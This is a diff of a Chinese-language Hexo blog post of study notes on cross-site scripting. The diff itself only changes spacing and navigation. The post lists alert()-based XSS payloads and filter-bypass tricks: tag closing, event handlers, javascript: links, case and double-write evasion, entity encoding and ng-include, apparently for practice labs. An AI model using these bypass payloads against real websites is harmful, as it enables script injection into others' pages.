@@ -40,44 +40,44 @@ document.addEventListener("pjax:complete", reset);document.addEventListener('pja
  "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
   bszTag.texts(a),
   bszTag.shows()
-}));reset()})</script><meta name="generator" content="Hexo 6.2.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>XSS</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-02-14T07:52:26.000Z" id="date"> 2024-02-14</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-02-14T10:54:50.940Z" id="updated"> 2024-02-14</time></div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br><br>在input中闭合input标签<br>&quot;&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;<br><br></code></pre></td></tr></table></figure>
+}));reset()})</script><meta name="generator" content="Hexo 6.2.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>XSS</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-02-14T07:52:26.000Z" id="date"> 2024-02-14</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-02-14T10:54:50.940Z" id="updated"> 2024-02-14</time></div></span><br><span>Word Count: <div class="control">533</div></span><br><span>Read Time: <div class="control">2 min</div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br><br> 在 input 中闭合 input 标签 <br>&quot;&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;<br><br></code></pre></td></tr></table></figure>
 
-<p>当特殊符号被编码或者被过滤时，</p>
-<p>若单双引号正常，可用onmouseover事件或onmouseout事件</p>
-<p> 这一事件的效果是当我们的鼠标碰到input标签的位置，也就是搜索框时，会执行onmouseover事件。‘或”闭合标签的单双引号</p>
+<p> 当特殊符号被编码或者被过滤时，</p>
+<p> 若单双引号正常，可用 onmouseover 事件或 onmouseout 事件 </p>
+<p> 这一事件的效果是当我们的鼠标碰到 input 标签的位置，也就是搜索框时，会执行 onmouseover 事件。‘或”闭合标签的单双引号 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; onmouseover=javascript:alert(1) &#x27;<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&gt;//<br></code></pre></td></tr></table></figure>
 
-<p>当某字符之间被强制加入下划线等符号或者被编码，则可用javascript伪协议，</p>
-<p>构造闭合后新建一个a标签，在其中使用伪协议进行绕过</p>
+<p> 当某字符之间被强制加入下划线等符号或者被编码，则可用 javascript 伪协议，</p>
+<p> 构造闭合后新建一个 a 标签，在其中使用伪协议进行绕过 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;a href=javascript:alert(/1/)&gt;<br></code></pre></td></tr></table></figure>
 
 
 
-<p>当标签也被过滤（加下划线等或者被删除），还有大小写绕过，双写绕过</p>
+<p> 当标签也被过滤（加下划线等或者被删除），还有大小写绕过，双写绕过 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;ScripT&gt;alert(1)&lt;/ScRipt&gt;<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;sscriptcript&gt;alert(&#x27;xss&#x27;)&lt;/sscriptcript&gt;<br></code></pre></td></tr></table></figure>
 
-<p>当有url正常格式合法检查时，可在正常网址格式前加入恶意代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javascript:alert(&#x27;xss&#x27;)http://www.qq.com<br>再unicode编码绕过<br>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;//http://www.baidu.com<br></code></pre></td></tr></table></figure>
+<p> 当有 url 正常格式合法检查时，可在正常网址格式前加入恶意代码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javascript:alert(&#x27;xss&#x27;)http://www.qq.com<br> 再 unicode 编码绕过 <br>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;//http://www.baidu.com<br></code></pre></td></tr></table></figure>
 
-<p>一步步依次排查网页检测过滤的条件逐步绕过</p>
-<p>还可以直接修改隐藏属性，</p>
+<p> 一步步依次排查网页检测过滤的条件逐步绕过 </p>
+<p> 还可以直接修改隐藏属性，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?keyword=nul&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)<br><br></code></pre></td></tr></table></figure>
 
-<p>还可观察数据包查看哪些字段可以被插入如reference，cookie等</p>
-<p>标签中有class&#x3D;”ng-include:”则可包含有漏洞的文件进行攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?src=&#x27;/level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#x27;<br></code></pre></td></tr></table></figure>
+<p> 还可观察数据包查看哪些字段可以被插入如 reference，cookie 等 </p>
+<p> 标签中有 class&#x3D;”ng-include:”则可包含有漏洞的文件进行攻击 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?src=&#x27;/level1.php?name=&lt;p onmousedown=alert()&gt; 哈哈哈 &lt;/p&gt;&#x27;<br></code></pre></td></tr></table></figure>
 
-<p>回车（%0a）还可代替空格 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">测试关键字<br>&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; <br></code></pre></td></tr></table></figure>
+<p> 回车（%0a）还可代替空格 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> 测试关键字 <br>&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; <br></code></pre></td></tr></table></figure>
 
-<p>如果会将输入输出，可以使用以下来显示出链接</p>
+<p> 如果会将输入输出，可以使用以下来显示出链接 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure>
 
 
 
-<p>总结：想办法闭合，注意格式，绕过时双写，编码，大小写，或者用别的方法（伪协议，onclick，）</p>
+<p> 总结：想办法闭合，注意格式，绕过时双写，编码，大小写，或者用别的方法（伪协议，onclick，）</p>
 <div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/14/sql%20inj/">← Next SQL injection</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">John Doe</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
